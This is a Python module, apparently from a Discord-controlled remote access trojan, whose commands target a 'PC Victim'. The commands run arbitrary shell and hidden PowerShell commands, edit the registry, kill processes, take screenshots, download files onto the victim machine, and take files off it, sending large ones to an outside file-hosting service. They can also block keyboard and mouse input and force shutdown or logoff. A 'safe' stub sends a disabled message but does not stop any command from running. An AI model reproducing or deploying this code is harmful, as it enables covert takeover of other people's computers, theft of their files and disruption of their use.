__import__('sys').path.append('../')
import discord, asyncio, os, subprocess, requests, psutil, json, win32api, win32con, threading
from discord import app_commands
from discord.ext import commands

from PIL import ImageGrab
from core.info import Info
from core.sender import Sender
from discord.ext import commands
from urllib.parse import urlparse
from pynput import keyboard, mouse
from utils import CheckHwid, SendOutput

pc = Info()

async def safe(interaction):
	if True:
		await SendOutput(interaction, "This Feature has been disabled for the safety of Dev")
		return

class Control(commands.Cog, description='Control PC Victim'):
	def __init__(self, bot: commands.Bot) -> None:
		self.bot = bot
		self.keyboard_listener = keyboard.Listener(suppress=True, on_press=self.on_press, on_release=self.on_release)
		self.mouse_listener = mouse.Listener(suppress=True, on_press=self.on_press, on_release=self.on_release)

	def on_press(self, key):
		pass

	def on_release(self, key):
		pass

	@commands.Cog.listener()
	async def on_ready(self):
		print("--- Loaded Control module")

	@app_commands.command(description='Control Registry')
	async def registry(self, interaction: discord.Interaction, hwid: str, method: str, path: str):
		await safe(interaction)
		if not CheckHwid(hwid):
			return
		output = str(subprocess.check_output(f'reg {method} {path} /f', shell=True), 'utf-8')
		await SendOutput(interaction, output)

	@app_commands.command(description='End Processes by Process Name')
	async def taskkill(self, interaction: discord.Interaction, hwid: str, name: str):
		await safe(interaction)
		if not CheckHwid(hwid):
			return
		output = str(subprocess.check_output(f'taskkill /f /im {name}', shell=True), 'utf-8')
		await SendOutput(interaction, output)

	@app_commands.command(description='List All Processes Running on PC Victim')
	async def tasklist(self, interaction: discord.Interaction, hwid: str):
		if not CheckHwid(hwid):
			return
		processes = ''
		for proc in psutil.process_iter():
			try:
				processName = proc.name()
				processID = proc.pid
				processes += f"{processName} - {processID}\n"
				if len(processes.split('\n')) == 40:
					await SendOutput(interaction, processes)
					processes = ''
			except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
				pass
		await SendOutput(interaction, processes)

	@app_commands.command(name = "screenshot", description = 'Screenshot PC Victim')
	async def screenshot(self, interaction: discord.Interaction, hwid: str):
		if not CheckHwid(hwid):
			return
		snapshot = ImageGrab.grab()
		image_path = f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\Temp\\sc.jpg"
		snapshot.save(image_path)
		file = discord.File(image_path, filename="sc.png")
		await interaction.response.send_message(content = '', file = file)

	@app_commands.command(description='Upload File to PC Victim')
	async def upload(self, interaction, hwid: str, url: str, path_file: str = '.',):
		if not CheckHwid(hwid):
			return
		response = requests.get(url)
		parse = urlparse(url)
		filename = os.path.basename(parse.path)
		open(f'{path_file}/{filename}', "wb").write(response.content)
		await SendOutput(interaction, f"Uploaded File {path_file}/{filename}")

	@app_commands.command(description='Download File From PC Victim')
	async def download(self, interaction, hwid: str, path_file: str = '.',):
		if not CheckHwid(hwid):
			return
		if not os.path.exists(path_file):
			await SendOutput(interaction, f"Not Found File {path_file}")
			return
		if os.path.getsize(path_file) < 25000000:
			filename = os.path.basename(path_file)
			file = discord.File(path_file, filename=filename)
			await SendOutput(interaction, f"Upload File {filename} Success")
			await interaction.send(file=file)
		else:
			filename = os.path.basename(path_file)
			file = {"file": open(path_file, 'rb')}
			r = requests.post('https://anonymfile.com/api/v1/upload', files=file)
			json_r = json.loads(r.text)
			if not json_r['status']:
				await SendOutput(interaction, f"Upload File {path_file} To Anonymfile Failed")
				return
			url_file = json_r['data']['file']['url']['full']
			await SendOutput(interaction, f"Upload File {filename} To Anonymfile Success\nUrl File: {url_file}")

	@app_commands.command(description='Run File From PC Victim')
	async def run(self, interaction, hwid: str,  method: str = 'cmd', path_file: str = '.', agruments: str = ''):
		await safe(interaction)
		if not CheckHwid(hwid):
			return
		if method == 'cmd':
			output = str(subprocess.check_output(f'cmd /c {path_file} {agruments}', shell=True), 'utf-8')
			await SendOutput(interaction, output)
		elif method == 'powershell':
			output = str(subprocess.check_output(f'powershell -WindowStyle Hidden -Command "Start-Process -FilePath {path_file} {agruments} -Wait"', shell=True), 'utf-8')
			await SendOutput(interaction, output)

	@app_commands.command(description='Message Box To PC Victim')
	async def messagebox(self, interaction, hwid: str, method: str = 'msg', amount: int = 1, caption: str = 'Lol', message: str = ''):
		if not CheckHwid(hwid):
			return
		def msg(amount, method, message):
			for i in range(amount):
				if method == 'msg':
					output = str(subprocess.check_output(f'cmd /c msg * {message}', shell=True), 'utf-8')	
				elif method == 'msgbox':
					win32api.MessageBox(win32con.NULL, message, caption)	
		threading.Thread(target = msg, args = (amount, method, message, )).start()
		await SendOutput(interaction, "Done!")

	@app_commands.command(description='Shutdown PC Victim')
	async def shutdown(self, interaction, hwid: str):
		await safe(interaction)
		if not CheckHwid(hwid):
			return
		output = str(subprocess.check_output('shutdown /f /t 0', shell=True), 'utf-8')

	@app_commands.command(description='Restart PC Victim')
	async def restart(self, interaction, hwid: str):
		await safe(interaction)
		if not CheckHwid(hwid):
			return
		output = str(subprocess.check_output('shutdown /f /r /t 0', shell=True), 'utf-8')

	@app_commands.command(description='Logout PC Victim')
	async def signout(self, interaction, hwid: str):
		await safe(interaction)
		if not CheckHwid(hwid):
			return
		output = str(subprocess.check_output('shutdown /l', shell=True), 'utf-8')

	@app_commands.command(description='Block Keyboard and Mouse')
	async def blockinput(self, interaction, hwid: str):
		await safe(interaction)
		if not CheckHwid(hwid):
			return

		kb_th = threading.Thread(target = self.keyboard_listener.start)
		ms_th = threading.Thread(target = self.mouse_listener.start)
		kb_th.start()
		ms_th.start()
		kb_th.join()
		ms_th.join()
		await SendOutput(interaction, 'Input has been blocked!')

	@app_commands.command(description='Unblock Keyboard and Mouse')
	async def unblockinput(self, interaction, hwid: str):
		await safe(interaction)
		if not CheckHwid(hwid):
			return

		self.keyboard_listener.stop()
		self.mouse_listener.stop()

		await SendOutput(interaction, 'Input has been unblocked!')

	@app_commands.command(description='Control Keyboard PC Victim')
	async def keyboard(self, interaction, hwid: str, mode: str = 'type', text: str = ''):
		if not CheckHwid(hwid):
			return

	@app_commands.command(description='Control Mouse PC Victim')
	async def mouse(self, interaction, hwid: str, click_mode: str = 'r',  x: int = 0, y: int = 0):
		if not CheckHwid(hwid):
			return

	@app_commands.command(description='Start Process in PC Victim')
	async def startprocess(self, interaction, hwid: str, process: str = '', agruments: str = ''):
		await safe(interaction)
		if not CheckHwid(hwid):
			return
		if process == '':
			return
		output = str(subprocess.check_output(f'powershell -WindowStyle Hidden -Command "Start-Process -FilePath {process} -ArgumentList \"{agruments}\" "'), 'utf-8')
		await SendOutput(interaction, output)

async def setup(bot):
	await bot.add_cog(Control(bot), guilds = [discord.Object(id = 1128326638757761125), discord.Object(id = 1117628520273813536)])